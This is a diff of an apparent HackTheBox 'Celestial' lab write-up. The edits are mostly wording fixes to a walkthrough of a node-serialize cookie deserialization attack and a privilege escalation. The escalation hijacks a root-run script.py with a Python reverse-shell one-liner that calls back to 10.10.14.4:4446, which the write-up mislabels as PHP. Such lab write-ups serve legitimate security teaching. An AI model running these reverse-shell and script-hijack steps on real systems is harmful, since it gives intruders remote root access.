@@ -11,7 +11,7 @@ That only reveals an open port on 3000 running the Node.js Express Framework.
 
 # Enumeration
 
-After browsing to the website we run into a 404. But after refreshing we get different message. BurpSuite shows that on the first visit a cookie is set and after revisiting this is passed as a parameter.
+After browsing to the website we run into a 404. But after refreshing we get a different message, some sort of formula. BurpSuite shows that on the first visit a cookie is set and after revisiting this is passed as a parameter.
 
 Removing the following from the get request resulted in an error. This tells us that the data appears to be unserialized. We also spot a username: ```sun```.
 ```
@@ -47,28 +47,28 @@ console.log("Serialized: \n" + s.slice(0,-2) + "()" + s.slice(-2,));
 
 Running ```nodejs exploit.js``` will create our serialized payload.
 
-I had a issue saying the node-serilize module could not be found. Running ```npm install``` solved this.
+I had a issue saying the node-serialize module could not be found. Running ```npm install``` solved this.
 
-After this we finally base64 encode it so we can pass it as the cookie parameter. We make sure to have our listener ready before we send our request with BurpSuite. This will result in an error but at the same time provides us with a reverse shell as user ```sun```.
+After these steps we finally base64 encode it so we can pass it as the cookie parameter. We make sure to have our listener ready before we send our request with BurpSuite. This will result in an error but at the same time provides us with a reverse shell as user ```sun```.
 
 <img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/5.png">
 
 
 # Privilege Escalation
-First we'll stabilize the shell. We'll run ```which python``` to shows that it has python.
+First we'll upgrade the shell. We'll run ```which python``` to see if it has python installed.
 We then run the following commands:
 ```
 python -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 
-press ctrl+z key combination 
+Press ctrl+z key combination 
 
 stty raw -echo; fg
 ```
 
-One thing we notice is that user ```sun``` is part of the ```sudo``` group. We also spot a file called ```script.py``` in the home directory. One directory higher we find ```output.txt``` which get's changed every 5 minutes. The content is the content from ```script.py```.
+One thing we notice is that user ```sun``` is part of the ```sudo``` group. We also spot a file called ```script.py``` in the home directory. One directory up we find ```output.txt``` which get's changed every 5 minutes. The content is the content from ```script.py```.
 
-If this script is initiated by a root account we can try to alter the content of the file in order to give us a root shell.
+If this script is initiated by the root user we can try to alter the content of the file in order to give us a root shell.
 
 We can use ```pspy``` to see what's exactly going on. Download it from [here](https://github.com/DominicBreuker/pspy). 
 
@@ -81,6 +81,6 @@ Good news! Now we can use a oneliner php shell and save it as the script:
 echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",4446));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);" > script.py
 ```
 
-With our new listener ready on port 4446 we wait for a few minutes for the script to run. As soon as it gets executed a root shell will pop up.
+With our new listener ready on port 4446 we wait a few minutes for the script to run. As soon as it gets executed a root shell will pop up.
 
 <img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/7.png">
